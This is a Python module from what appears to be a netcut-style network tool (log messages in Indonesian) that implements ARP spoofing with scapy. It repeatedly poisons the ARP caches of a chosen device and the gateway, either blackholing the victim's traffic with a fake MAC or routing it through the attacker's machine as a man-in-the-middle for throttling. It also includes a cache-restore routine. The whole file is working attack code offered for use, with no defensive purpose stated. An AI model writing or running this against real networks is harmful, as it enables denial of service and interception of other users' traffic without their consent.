"""ARP spoofing engine.

Two modes:
  - "cut":      poison the TARGET and GATEWAY so each thinks the other lives at a
                non-existent (fake) MAC -> the traffic is blackholed. This stays
                reliable even if IP forwarding happens to be enabled for throttle.
  - "throttle": poison so both think the other is at OUR MAC -> traffic transits
                this machine, where the throttle module (WinDivert) shapes it.

On stop we send the correct mappings several times so the caches heal
immediately instead of waiting to time out.

Safety: the engine refuses to target the gateway or our own machine.
"""
import threading
import time

from . import config
from .logutil import log

# A deliberately non-existent MAC used to blackhole "cut" targets.
FAKE_MAC = "de:ad:be:ef:1d:0a"


class Spoofer:
    def __init__(self, netinfo):
        self.net = netinfo
        self._targets = {}        # ip -> {"mac": str, "mode": "cut"|"throttle"}
        self._lock = threading.Lock()
        self._thread = None
        self._running = False
        # Optional hook: set by throttle manager to be told about MITM'd IPs.
        self.on_targets_changed = None

    # ---- public API -----------------------------------------------------
    def is_protected_ip(self, ip: str) -> bool:
        """These must never be cut."""
        return ip in (self.net.gateway_ip, self.net.local_ip)

    def targets(self):
        with self._lock:
            return dict(self._targets)

    def is_active(self, ip: str) -> bool:
        with self._lock:
            return ip in self._targets

    def add(self, ip: str, mac: str, mode: str = "cut") -> bool:
        if self.is_protected_ip(ip):
            log("Menolak target terlindungi: %s" % ip, "WARN")
            return False
        if not (self.net.gateway_ip and self.net.gateway_mac and self.net.local_mac):
            log("Tidak bisa spoof: info gateway/MAC belum lengkap.", "ERROR")
            return False
        with self._lock:
            self._targets[ip] = {"mac": mac.lower(), "mode": mode}
        log("Target ditambahkan (%s): %s [%s]" % (mode, ip, mac))
        self._ensure_running()
        self._notify()
        return True

    def remove(self, ip: str):
        info = None
        with self._lock:
            info = self._targets.pop(ip, None)
            empty = not self._targets
        if info:
            self._restore(ip, info["mac"])
            log("Target dilepas: %s" % ip)
        if empty:
            self.stop()
        self._notify()

    def clear(self):
        with self._lock:
            items = list(self._targets.items())
            self._targets.clear()
        for ip, info in items:
            self._restore(ip, info["mac"])
        self.stop()
        self._notify()

    def stop(self):
        self._running = False

    # ---- internals ------------------------------------------------------
    def _notify(self):
        if self.on_targets_changed:
            try:
                self.on_targets_changed(self.targets())
            except Exception:
                pass

    def _ensure_running(self):
        if not self._running:
            self._running = True
            self._thread = threading.Thread(target=self._loop, daemon=True)
            self._thread.start()

    def _loop(self):
        while self._running:
            for ip, info in self.targets().items():
                try:
                    self._poison(ip, info["mac"], info.get("mode", "cut"))
                except Exception as e:
                    log("Gagal kirim poison ke %s: %s" % (ip, e), "WARN")
            time.sleep(config.SPOOF_INTERVAL)

    def _send(self, dst_mac: str, **arp_kwargs):
        # Send at layer 2 (sendp + Ether). Using send()+iface on an ARP packet
        # raises "Cannot use iface= with this packet type"; sendp is the correct
        # way and lets us pin the exact interface on a multi-adapter machine.
        from scapy.all import ARP, Ether, sendp
        pkt = Ether(dst=dst_mac) / ARP(**arp_kwargs)
        kw = dict(verbose=0)
        if self.net.iface is not None:
            kw["iface"] = self.net.iface
        sendp(pkt, **kw)

    def _poison(self, target_ip: str, target_mac: str, mode: str = "cut"):
        # "mitm"/"throttle": traffic must flow THROUGH us -> advertise our MAC.
        # "cut": advertise a fake MAC so the traffic is blackholed.
        spoof_mac = (self.net.local_mac if mode in ("mitm", "throttle")
                     else FAKE_MAC)
        g_ip, g_mac = self.net.gateway_ip, self.net.gateway_mac
        # frame to the target: "the gateway is at spoof_mac"
        self._send(target_mac, op=2, pdst=target_ip, hwdst=target_mac,
                   psrc=g_ip, hwsrc=spoof_mac)
        # frame to the gateway: "the target is at spoof_mac"
        self._send(g_mac, op=2, pdst=g_ip, hwdst=g_mac,
                   psrc=target_ip, hwsrc=spoof_mac)

    def _restore(self, target_ip: str, target_mac: str):
        g_ip, g_mac = self.net.gateway_ip, self.net.gateway_mac
        if not (g_ip and g_mac):
            return
        for _ in range(5):
            try:
                self._send(target_mac, op=2, pdst=target_ip, hwdst=target_mac,
                           psrc=g_ip, hwsrc=g_mac)
                self._send(g_mac, op=2, pdst=g_ip, hwdst=g_mac,
                           psrc=target_ip, hwsrc=target_mac)
            except Exception:
                break
            time.sleep(0.2)
